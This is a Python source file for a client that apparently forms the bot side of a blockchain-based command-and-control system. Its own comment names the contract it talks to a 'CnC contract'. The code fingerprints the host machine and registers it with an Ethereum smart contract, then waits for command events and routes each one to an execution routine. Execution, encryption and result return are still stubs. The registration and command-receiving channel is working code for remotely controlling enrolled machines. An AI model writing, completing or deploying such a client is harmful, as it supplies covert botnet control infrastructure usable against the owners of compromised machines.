import time, sys, json, signal, shutil, atexit, yaml
from os.path import join as opj
from web3 import Web3, HTTPProvider

import Client.OsInteractions as OsInteractions
from web3.utils.events import get_event_data
from web3.utils.abi import filter_by_name,abi_to_signature
from web3.contract import ConciseContract
from Util.SolidityTypeConversionUtil import *
from Util.Process import waitFor, kill_proc
from Util.EtherKeysUtil import *
from Util.EtherTransaction import *


REGISTRATION_CONFIRMATION_EVENT_NAME = 'InstanceRegistered'
COMMAND_PENDING_EVENT_NAME = 'CommandPending'
from geth import DevGethProcess


l = LogWrapper.getLogger()

class ClientCommands:

	def __init__(self, confFile):
		conf = yaml.safe_load(open(confFile))

		self.contractAddress = conf['contract']['address']
		self.contractAbi = conf['contract']['abi']

		# TODO: check node is up. load node if not ,wait for connection and sync.
		proc = self.runGethNode(conf)
		# connect to local node
		self.web3 = Web3(HTTPProvider(conf['nodeRpcUrl']))

		self.web3.admin.addPeer(conf['enode'])
		peers = waitFor (lambda : self.web3.admin.peers, emptyResponse=[],pollInterval=0.1, maxRetries=10)
		assert (len(peers) > 0)
		l.info('connected peers:',self.web3.admin.peers)

		# load CnC contract
		self.contract = self.loadContract()
		#TODO: check contract is up, otherwise go to sleep or die

		self.password = conf['clientWalletPassword']
		self.public, self.private, self.address = loadWallet(conf['clientWallet'], self.password)

		l.info("client wallet:",self.address, "contract:",self.contractAddress)
		importAccountToNode(self.web3, self.address, self.private, self.password)

		self.sessionId=None

	def loadContract(self):
		l.info('loading contract from:', self.contractAddress, self.contractAbi)

		contract = self.web3.eth.contract(self.contractAbi, self.contractAddress,  ContractFactoryClass=ConciseContract)
		return contract

	def registered(self):
		return self.sessionId != None

	def registerInstance(self):
		if self.registered():
			return True

		self.machineId = OsInteractions.fingerprintMachine()

		currBlock = self.web3.eth.blockNumber
		filter = self.web3.eth.filter({'from': self.address, 'fromBlock': currBlock})

		try:
			machineIdHash = self.web3.sha3(self.machineId)
			self.contract.registerInstance(machineIdHash, transact={'from': self.address, 'gas': 3000000})

			self.commandFilter, eventABI = createLogEventFilter(REGISTRATION_CONFIRMATION_EVENT_NAME,
																self.contractAbi,
																self.contractAddress,
																self.web3,
																topicFilters=[self.web3.sha3(self.address)])

			def callback(tx):
				self.sessionId = bytesToHexString(getLogEventArg(tx, eventABI, 'sessionId'))
				l.info('Successful registration! SessionId:', self.sessionId)
			self.commandFilter.watch(callback)
			waitForTransaction(self.commandFilter)
			# logs = waitFor(lambda: filter.get(True), emptyResponse=[], pollInterval=1, maxRetries=30)
            #
			# self.web3.eth.uninstallFilter(filter.filter_id)
            #
			# self.sessionId = bytesToHexString(self.getLogData(REGISTRATION_EVENT_NAME, logs)[0]['args']['sessionId'])
			# l.info('Successful registration! SessionId:', self.sessionId)
		except Exception as e:
			l.error("Error in returned log event:", e)
			self.sessionId = None

		return self.registered()



	def getLogData (self, eventName, logs) -> list:
		#eabi = [m for m in self.abi if m.get('name', '-1') == eventName]
		eabi = filter_by_name(eventName,self.contractAbi)
		return [get_event_data(eabi[0],log) for log in logs ] if eabi else []


	def waitForWork(self):
		pass

	def doWork(self, work):
		#TODO actually execute stuff...
		return 'Awsome'

	def sendResults(self, workResults):
		pass

	def decryptMessageFromServer(self, msg):
		#TODO actual decryption
		return msg

	def encryptMessageForServer(self, msg):
		#TODO actual encryption
		return msg




	def mainLoop(self):
			sleep = 1
			while not self.registered():
				l.info('trying to register instance')
				success = self.registerInstance()
				if not success:
					time.sleep(sleep)
					sleep *= 2

			if self.registered():
				try:
					l.info('instance is now registered with server. waiting for work...')
					self.commandFilter, eventABI = createLogEventFilter(COMMAND_PENDING_EVENT_NAME,
										 self.contractAbi,
										 self.contractAddress,
										 self.web3,
										 topicFilters = [self.web3.sha3(self.address)])
					# eventABI = filter_by_name(COMMAND_PENDING_EVENT_NAME, self.contractAbi)[0]
					# eventSignature = abi_to_signature(eventABI)
					# eventHash = self.web3.sha3(encode_hex(eventSignature))
					# l.debug('eventSignature:',eventSignature,'eventHash:',eventHash)
					# self.commandFilter = self.web3.eth.filter({'from':self.contractAddress,
					# 					  'topics': [eventHash, self.web3.sha3(self.address)]})
					def onCommandArrival(tx):
						l.debug('new command event:',tx)

						command = getLogEventArg(tx, eventABI,'command')
						cmdId = getLogEventArg(tx, eventABI, 'cmdId')

						commandDec = self.decryptMessageFromServer(command)
						l.info('Decrypted a new command from server. id:',cmdId,'cmd:',commandDec)

						workResults = self.doWork(commandDec)
						l.info('Command',cmdId, 'execution complete:', workResults)

						workResultsEnc = self.encryptMessageForServer(workResults)
						self.sendResults(workResultsEnc)

					self.commandFilter.watch(onCommandArrival)
				except Exception as e:
					l.error("Error in event watcher registration:", e)
					if self.commandFilter and self.commandFilter.running:
						self.commandFilter.stopWatching()



	def runGethNode(self, conf):
		gethLockFile = opj(conf['BlockChainData'], 'LOCK.pid')
		if (os.path.isfile(gethLockFile)):
			with open (gethLockFile) as f:
				pid = f.read()
				if (pid):
					try:
						os.kill(int(pid), signal.SIGTERM)
						time.sleep (1)
						l.debug('Old geth was running at PID:',pid,'. Killed.')
					except OSError:
						pass #all good because process wasn't running anymore

		# genesis = ast.literal_eval(conf['genesis'])

		if conf['opMode'] == 'test':
			if not os.path.exists(conf['genesisFile']):
				l.warning('Fresh start! removing blockchain dir ',conf['BlockChainData'])

				shutil.rmtree(conf['BlockChainData'],ignore_errors=True)

				with open(conf['genesisFile'], 'w') as f:
					json.dump(conf['genesis'], f, indent=1)

				l.info('Initializing blockchain...')
				cmd = [conf['geth'],'--datadir',conf['BlockChainData'],	'init',	conf['genesisFile']]

				l.debug('Running geth init: ' , ' '.join(cmd))
				with open(opj('logs', 'geth.client.log'), 'a') as f:
					proc = runCommand(cmd, stdout=f)
					proc.communicate()
		elif conf['opMode'] == 'TestNet':
			pass
		elif conf['opMode'] == 'RealNet':
			pass

		l.info('Running geth node...')
		cmd = conf['gethCmd']
		l.debug('Running light geth : ' , ' '.join(cmd))

		proc = runCommand(cmd, stderr=open(opj('logs', 'geth.client.log'), 'a'))

		if proc.returncode:
			std,sterr = proc.communicate()
			raise ValueError(format_error_message(
				"Error trying to run geth node",cmd,proc.returncode,std,sterr,))

		atexit.register(lambda: kill_proc(proc))
		time.sleep(3)

		with open(gethLockFile,'w') as f:
			f.write(str(proc.pid))
		l.info('Geth node running. PID:',str(proc.pid))

		return proc

if __name__ == "__main__":
	l.info ("base dir ",sys.argv[1])

	os.chdir(sys.argv[1])
	confFile = sys.argv[2]

	cc = ClientCommands(confFile)

	cc.mainLoop()
	# cc.registerInstance()

	#print ("wallet:",cc.walletAddress, "sessionId", cc.sessionId, "machineId:",cc.machineId)




